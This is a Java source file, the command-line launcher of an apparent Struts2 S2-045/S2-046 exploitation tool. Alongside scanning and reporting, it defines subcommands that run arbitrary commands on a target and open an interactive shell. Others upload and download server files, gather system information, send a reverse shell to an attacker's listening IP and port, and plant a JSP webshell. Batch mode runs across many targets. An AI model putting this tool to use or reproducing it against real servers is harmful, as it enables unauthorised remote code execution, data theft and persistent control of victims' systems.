package com.s2tool;

import com.s2tool.core.HttpClient;
import com.s2tool.core.Target;
import com.s2tool.modules.Advanced;
import com.s2tool.modules.Detector;
import com.s2tool.modules.Executor;
import com.s2tool.modules.FileManager;
import com.s2tool.modules.InfoGather;
import com.s2tool.modules.Shell;
import com.s2tool.plugins.DetectionResult;
import com.s2tool.plugins.PluginManager;
import com.s2tool.plugins.VulnInfo;
import com.s2tool.report.ConsoleReporter;
import com.s2tool.report.HtmlReporter;
import com.s2tool.report.JsonReporter;
import com.s2tool.utils.Logger;
import picocli.CommandLine;
import picocli.CommandLine.Command;
import picocli.CommandLine.Option;
import picocli.CommandLine.Parameters;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Callable;

/**
 * 程序主入口：Picocli 命令行界面，支持 scan / exec / shell / upload / download
 * / getpath / sysinfo / revshell / webshell / batch 子命令。
 */
@Command(name = "s2tool",
        description = "Struts2 S2-045 漏洞检测与利用工具",
        mixinStandardHelpOptions = true,
        version = "s2tool 1.0.0",
        subcommands = {
                Launcher.ScanCmd.class,
                Launcher.ExecCmd.class,
                Launcher.ShellCmd.class,
                Launcher.UploadCmd.class,
                Launcher.DownloadCmd.class,
                Launcher.GetPathCmd.class,
                Launcher.SysInfoCmd.class,
                Launcher.RevShellCmd.class,
                Launcher.WebshellCmd.class,
                Launcher.BatchCmd.class
        })
public class Launcher implements Callable<Integer> {

    public static final String TOOL_NAME = "Struts2 漏洞检测工具";
    public static final String VERSION = "1.0.0";

    @Option(names = {"-q", "--quiet"}, description = "静默模式（仅输出关键结果）")
    boolean quiet;

    @Option(names = {"-v", "--verbose"}, description = "调试模式（输出详细日志）")
    boolean verbose;

    @Override
    public Integer call() {
        CommandLine.usage(this, System.out);
        return 0;
    }

    public static void main(String[] args) {
        int exitCode = new CommandLine(new Launcher()).execute(args);
        System.exit(exitCode);
    }

    // ==================== 公共选项 ====================

    /** 网络与会话公共选项 */
    static class CommonOptions {
        @Option(names = {"-q", "--quiet"}, description = "静默模式（仅输出关键结果）")
        boolean quiet;

        @Option(names = {"-v", "--verbose"}, description = "调试模式（输出详细日志）")
        boolean verbose;

        void initLogger() {
            Logger.setQuiet(quiet);
            if (verbose) Logger.setLevel(Logger.Level.DEBUG);
        }

        @Option(names = {"--cookie"}, description = "会话 Cookie，如 \"JSESSIONID=xxx\"")
        String cookie;

        @Option(names = {"--user-agent"}, description = "自定义 User-Agent")
        String userAgent;

        @Option(names = {"--auth-user"}, description = "Basic Auth 用户名")
        String authUser;

        @Option(names = {"--auth-pass"}, description = "Basic Auth 密码")
        String authPass;

        @Option(names = {"--proxy"}, description = "HTTP 代理，如 http://proxy-host:8080")
        String proxy;

        @Option(names = {"--timeout"}, description = "连接超时(秒)，默认 5")
        int connectTimeout = 5;

        @Option(names = {"--read-timeout"}, description = "读取超时(秒)，默认 15")
        int readTimeout = 15;

        Target buildTarget(String url) {
            Target t = new Target(url);
            if (cookie != null) t.setCookie(cookie);
            if (userAgent != null) t.setUserAgent(userAgent);
            if (authUser != null) t.setBasicAuth(authUser, authPass);
            return t;
        }

        String proxyHost() {
            if (proxy == null || proxy.isEmpty()) return null;
            String p = proxy.replace("http://", "").replace("https://", "");
            return p.contains(":") ? p.split(":")[0] : p;
        }

        int proxyPort() {
            if (proxy == null || proxy.isEmpty()) return 0;
            String p = proxy.replace("http://", "").replace("https://", "");
            if (p.contains(":")) {
                try { return Integer.parseInt(p.split(":")[1]); } catch (NumberFormatException ignored) {}
            }
            return 80;
        }

        HttpClient buildHttp(Target target) {
            return new HttpClient(connectTimeout * 1000, readTimeout * 1000,
                    target.getUserAgent(), proxyHost(), proxyPort(), null, null, true);
        }
    }

    // ==================== scan ====================

    @Command(name = "scan", description = "检测目标是否存在 S2-045 / S2-046 漏洞",
            mixinStandardHelpOptions = true)
    static class ScanCmd extends CommonOptions implements Callable<Integer> {
        @Parameters(index = "0", description = "目标 URL，如 http://target-host/action.action")
        String url;

        @Option(names = {"-r", "--report"}, description = "输出报告: json / html / both / none")
        String report = "none";

        @Option(names = {"-o", "--output"}, description = "报告文件路径（默认自动命名）")
        String output;

        @Option(names = {"--header"}, description = "附加请求头，可多次指定: --header \"Name: value\"")
        List<String> headers = new ArrayList<>();

        @Override
        public Integer call() {
            initLogger();

            ConsoleReporter reporter = new ConsoleReporter();
            reporter.printHeader(TOOL_NAME, VERSION);

            Target target = buildTarget(url);
            Map<String, String> extraHeaders = parseHeaders(headers);
            Detector detector = new Detector.Builder()
                    .extraHeaders(extraHeaders)
                    .proxy(proxyHost(), proxyPort())
                    .connectTimeoutMs(connectTimeout * 1000)
                    .readTimeoutMs(readTimeout * 1000)
                    .build();

            Logger.info("开始检测: " + target.getFullUrl());
            Detector.ScanReport result = detector.scan(target);
            reporter.printScanStart(result);
            reporter.printTable(result, buildVulnInfoMap());
            reporter.printSummary(result);

            // 输出报告文件
            String fileOut = output;
            if (!"none".equals(report)) {
                String base = fileOut != null ? fileOut
                        : "report_" + target.getHost() + "_" + new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
                if ("json".equals(report) || "both".equals(report)) {
                    JsonReporter jr = new JsonReporter();
                    String p = jr.writeReport(result, null, base + ".json");
                    Logger.success("JSON 报告已导出: " + p);
                }
                if ("html".equals(report) || "both".equals(report)) {
                    HtmlReporter hr = new HtmlReporter();
                    String p = hr.writeReport(result, base + ".html");
                    Logger.success("HTML 报告已导出: " + p);
                }
            }

            // 默认控制台只输出表格结论；-v 时追加每个漏洞的动态检测证据
            // （静态元数据 CVE/影响版本/修复建议在 JSON/HTML 报告中归档）
            if (verbose) {
                for (String id : result.vulnOrder) {
                    DetectionResult r = result.results.get(id);
                    if (r.isConfirmed()) {
                        reporter.printDetectionEvidence(r);
                    }
                }
            }
            return result.countConfirmed() > 0 ? 0 : 1;
        }
    }

    // ==================== batch ====================

    @Command(name = "batch", description = "批量扫描多个目标（每行一个 URL 的文本文件）",
            mixinStandardHelpOptions = true)
    static class BatchCmd extends CommonOptions implements Callable<Integer> {
        @Parameters(index = "0", description = "目标列表文件路径（每行一个 URL）")
        String file;

        @Option(names = {"-t", "--threads"}, description = "并发线程数，默认 5")
        int threads = 5;

        @Option(names = {"-r", "--report"}, description = "输出报告: json / html / none")
        String report = "json";

        @Override
        public Integer call() {
            initLogger();
            ConsoleReporter reporter = new ConsoleReporter();
            reporter.printHeader(TOOL_NAME, VERSION);

            List<String> urls;
            try {
                urls = Files.readAllLines(Paths.get(file));
            } catch (Exception e) {
                Logger.fail("读取目标列表失败: " + e.getMessage());
                return 1;
            }
            // 去除 UTF-8 BOM 并过滤空行/注释行
            urls = new ArrayList<>(urls);
            for (int i = 0; i < urls.size(); i++) {
                String s = urls.get(i);
                if (s.startsWith("\uFEFF")) {
                    s = s.substring(1);
                    urls.set(i, s);
                }
            }
            urls.removeIf(s -> s.trim().isEmpty() || s.trim().startsWith("#"));
            Logger.info("批量检测: 共加载 " + urls.size() + " 个目标");
            if (urls.isEmpty()) {
                Logger.fail("目标列表为空");
                return 1;
            }

            List<Detector.ScanReport> reports = new ArrayList<>();
            int idx = 0;
            for (String u : urls) {
                idx++;
                String uu = u.trim();
                Logger.timed(String.format("[%d/%d] 目标: %s", idx, urls.size(), uu));
                try {
                    Target target = buildTarget(uu);
                    Detector detector = new Detector.Builder()
                            .proxy(proxyHost(), proxyPort())
                            .connectTimeoutMs(connectTimeout * 1000)
                            .readTimeoutMs(readTimeout * 1000)
                            .build();
                    Detector.ScanReport r = detector.scan(target);
                    reports.add(r);
                    int found = r.countConfirmed();
                    if (found > 0) {
                        Logger.success("  → 发现 " + found + " 个漏洞: " + String.join(", ", idsOf(r)));
                    } else {
                        Logger.raw("  → 未发现漏洞");
                    }
                } catch (Exception e) {
                    Logger.fail("  目标检测失败: " + e.getMessage());
                }
            }

            // 汇总
            Logger.raw("");
            Logger.raw("高风险目标汇总:");
            boolean any = false;
            for (Detector.ScanReport r : reports) {
                if (r.countConfirmed() > 0) {
                    any = true;
                    StringBuilder line = new StringBuilder("  " + r.target.getFullUrl() + " → ");
                    List<String> ids = new ArrayList<>();
                    for (String id : r.vulnOrder) {
                        if (r.results.get(id).isConfirmed()) {
                            ids.add(id + "(高危)");
                        }
                    }
                    line.append(String.join(", ", ids));
                    Logger.raw(line.toString());
                }
            }
            if (!any) Logger.raw("  (无)");

            if (!"none".equals(report)) {
                String base = "batch_report_" + new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
                if ("json".equals(report)) {
                    // 合并写为单文件
                    writeBatchJson(reports, base + ".json");
                } else {
                    int i = 0;
                    for (Detector.ScanReport r : reports) {
                        if (r.countConfirmed() > 0) {
                            i++;
                            new HtmlReporter().writeReport(r, base + "_" + i + "_" + r.target.getHost() + ".html");
                        }
                    }
                    Logger.success("HTML 报告已导出到 " + base + "_*.html");
                }
            }
            return 0;
        }

        private void writeBatchJson(List<Detector.ScanReport> reports, String path) {
            List<Map<String, Object>> list = new ArrayList<>();
            for (Detector.ScanReport r : reports) {
                Map<String, Object> m = new LinkedHashMap<>();
                m.put("target", r.target.getFullUrl());
                m.put("found", r.countConfirmed());
                m.put("suspicious", r.countSuspicious());
                m.put("duration_ms", r.getDurationMs());
                m.put("confirmed_vulns", idsOf(r));
                list.add(m);
            }
            try {
                com.fasterxml.jackson.databind.ObjectMapper om = new com.fasterxml.jackson.databind.ObjectMapper()
                        .enable(com.fasterxml.jackson.databind.SerializationFeature.INDENT_OUTPUT);
                Files.write(Paths.get(path), om.writeValueAsString(list).getBytes(java.nio.charset.StandardCharsets.UTF_8));
                Logger.success("批量 JSON 报告已导出: " + path);
            } catch (Exception e) {
                Logger.fail("批量报告导出失败: " + e.getMessage());
            }
        }

        private List<String> idsOf(Detector.ScanReport r) {
            List<String> ids = new ArrayList<>();
            for (String id : r.vulnOrder) {
                if (r.results.get(id).isConfirmed()) ids.add(id);
            }
            return ids;
        }
    }

    // ==================== exec ====================

    @Command(name = "exec", description = "在目标上执行系统命令（需先确认存在 S2-045）",
            mixinStandardHelpOptions = true)
    static class ExecCmd extends CommonOptions implements Callable<Integer> {
        @Parameters(index = "0", description = "目标 URL")
        String url;

        @Parameters(index = "1", arity = "0..*", description = "要执行的命令（可带空格）")
        List<String> commandParts;

        @Option(names = {"--timeout-ms"}, description = "命令执行超时(毫秒)，默认 30000")
        int execTimeout = 30000;

        @Override
        public Integer call() {
            initLogger();
            if (commandParts == null || commandParts.isEmpty()) {
                Logger.fail("请指定要执行的命令，如: exec http://target/ whoami");
                return 1;
            }
            String command = String.join(" ", commandParts);
            Target target = buildTarget(url);
            HttpClient http = buildHttp(target);
            try {
                Executor executor = new Executor(http, target);
                Logger.info("执行命令: " + command + "  @ " + target.getFullUrl());
                Executor.ExecResult r = executor.exec(command, execTimeout);
                if (r.isSuccess()) {
                    Logger.success("执行成功 (" + r.getElapsedMs() + "ms):");
                    System.out.println(r.getOutput());
                    return 0;
                } else {
                    Logger.fail("执行失败: " + r.getOutput());
                    return 1;
                }
            } finally {
                http.close();
            }
        }
    }

    // ==================== shell ====================

    @Command(name = "shell", description = "进入交互式 Shell（逐条命令执行）",
            mixinStandardHelpOptions = true)
    static class ShellCmd extends CommonOptions implements Callable<Integer> {
        @Parameters(index = "0", description = "目标 URL")
        String url;

        @Override
        public Integer call() {
            initLogger();
            Target target = buildTarget(url);
            HttpClient http = buildHttp(target);
            try {
                Shell shell = new Shell(http, target);
                shell.start();
            } finally {
                http.close();
            }
            return 0;
        }
    }

    // ==================== upload / download ====================

    @Command(name = "upload", description = "上传本地文件到目标服务器",
            mixinStandardHelpOptions = true)
    static class UploadCmd extends CommonOptions implements Callable<Integer> {
        @Parameters(index = "0", description = "目标 URL")
        String url;

        @Parameters(index = "1", description = "本地文件路径")
        String localFile;

        @Parameters(index = "2", description = "目标服务器绝对路径")
        String remotePath;

        @Option(names = {"--method"}, description = "上传方式: ognl(默认)/cmd")
        String method = "ognl";

        @Override
        public Integer call() {
            initLogger();
            Target target = buildTarget(url);
            HttpClient http = buildHttp(target);
            try {
                FileManager fm = new FileManager(http, target);
                String result = fm.upload(localFile, remotePath, method);
                if (result.startsWith("上传成功")) {
                    Logger.success(result);
                    return 0;
                } else {
                    Logger.fail(result);
                    return 1;
                }
            } finally {
                http.close();
            }
        }
    }

    @Command(name = "download", description = "下载目标服务器文件到本地",
            mixinStandardHelpOptions = true)
    static class DownloadCmd extends CommonOptions implements Callable<Integer> {
        @Parameters(index = "0", description = "目标 URL")
        String url;

        @Parameters(index = "1", description = "目标服务器文件路径")
        String remotePath;

        @Parameters(index = "2", description = "本地保存路径")
        String localPath;

        @Option(names = {"--method"}, description = "下载方式: b64(默认)/raw")
        String method = "b64";

        @Override
        public Integer call() {
            initLogger();
            Target target = buildTarget(url);
            HttpClient http = buildHttp(target);
            try {
                FileManager fm = new FileManager(http, target);
                String result = fm.download(remotePath, localPath, method);
                if (result.startsWith("下载成功")) {
                    Logger.success(result);
                    return 0;
                } else {
                    Logger.fail(result);
                    return 1;
                }
            } finally {
                http.close();
            }
        }
    }

    // ==================== getpath ====================

    @Command(name = "getpath", description = "获取目标 Web 应用物理根目录",
            mixinStandardHelpOptions = true)
    static class GetPathCmd extends CommonOptions implements Callable<Integer> {
        @Parameters(index = "0", description = "目标 URL")
        String url;

        @Override
        public Integer call() {
            initLogger();
            Target target = buildTarget(url);
            HttpClient http = buildHttp(target);
            try {
                InfoGather ig = new InfoGather(http, target);
                Logger.info("获取 Web 根目录: " + target.getFullUrl());
                String root = ig.getWebRoot();
                if (root != null) {
                    Logger.success("Web 根目录: " + root);
                    return 0;
                } else {
                    Logger.fail("获取失败（目标可能不存在 S2-045 或已修复）");
                    return 1;
                }
            } finally {
                http.close();
            }
        }
    }

    // ==================== sysinfo ====================

    @Command(name = "sysinfo", description = "获取目标系统信息（OS/用户/网络等）",
            mixinStandardHelpOptions = true)
    static class SysInfoCmd extends CommonOptions implements Callable<Integer> {
        @Parameters(index = "0", description = "目标 URL")
        String url;

        @Override
        public Integer call() {
            initLogger();
            Target target = buildTarget(url);
            HttpClient http = buildHttp(target);
            try {
                InfoGather ig = new InfoGather(http, target);
                String info = ig.getSystemInfo();
                Logger.success("系统信息:");
                System.out.println(info);
                return 0;
            } finally {
                http.close();
            }
        }
    }

    // ==================== revshell ====================

    @Command(name = "revshell", description = "反弹 Shell 到攻击机监听端口",
            mixinStandardHelpOptions = true)
    static class RevShellCmd extends CommonOptions implements Callable<Integer> {
        @Parameters(index = "0", description = "目标 URL")
        String url;

        @Option(names = {"--lhost"}, required = true, description = "攻击机监听 IP")
        String lhost;

        @Option(names = {"--lport"}, required = true, description = "攻击机监听端口")
        int lport;

        @Option(names = {"--os"}, description = "目标系统: auto(默认)/linux/windows")
        String os = "auto";

        @Override
        public Integer call() {
            initLogger();
            Target target = buildTarget(url);
            HttpClient http = buildHttp(target);
            try {
                Advanced adv = new Advanced(http, target);
                String result = adv.reverseShell(lhost, lport, os);
                Logger.info(result);
                return 0;
            } finally {
                http.close();
            }
        }
    }

    // ==================== webshell ====================

    @Command(name = "webshell", description = "一键生成并上传 JSP Webshell（明文 ?CMD= 风格）",
            mixinStandardHelpOptions = true)
    static class WebshellCmd extends CommonOptions implements Callable<Integer> {
        @Parameters(index = "0", description = "目标 URL")
        String url;

        @Option(names = {"--name"}, description = "Webshell 文件名，默认 s2tool_shell.jsp")
        String name = "s2tool_shell.jsp";

        @Option(names = {"--method"}, description = "上传方式: ognl(默认)/cmd")
        String method = "ognl";

        @Override
        public Integer call() {
            initLogger();
            Target target = buildTarget(url);
            HttpClient http = buildHttp(target);
            try {
                Advanced adv = new Advanced(http, target);
                String result = adv.uploadWebshell(name, method);
                Logger.raw("");
                for (String line : result.split("\n")) {
                    Logger.raw("  " + line);
                }
                Logger.raw("");
                return result.startsWith("上传成功") ? 0 : 1;
            } finally {
                http.close();
            }
        }
    }

    // ==================== 工具方法 ====================

    private static Map<String, String> parseHeaders(List<String> headerList) {
        Map<String, String> map = new LinkedHashMap<>();
        if (headerList != null) {
            for (String h : headerList) {
                int idx = h.indexOf(':');
                if (idx > 0) {
                    map.put(h.substring(0, idx).trim(), h.substring(idx + 1).trim());
                }
            }
        }
        return map;
    }

    private static Map<String, VulnInfo> buildVulnInfoMap() {
        PluginManager pm = new PluginManager();
        Map<String, VulnInfo> map = new LinkedHashMap<>();
        for (com.s2tool.plugins.VulPlugin p : pm.getAll()) {
            map.put(p.getInfo().getVulnId(), p.getInfo());
        }
        return map;
    }
}
